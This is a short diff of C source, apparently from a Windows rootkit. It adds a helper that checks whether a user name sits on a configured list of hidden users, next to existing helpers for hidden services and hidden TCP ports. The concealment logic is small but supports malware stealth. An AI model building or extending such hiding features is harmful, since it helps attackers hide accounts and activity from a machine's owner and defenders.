@@ -75,6 +75,10 @@ BOOL IsServiceNameHidden(LPCWSTR name)
 {
 	return Configuration && StringListContains(Configuration->HiddenServiceNames, name);
 }
+BOOL IsUserNameHidden(LPCWSTR name)
+{
+	return Configuration && StringListContains(Configuration->HiddenUserNames, name);
+}
 BOOL IsTcpLocalPortHidden(USHORT port)
 {
 	return Configuration && IntegerListContains(Configuration->HiddenTcpLocalPorts, port);
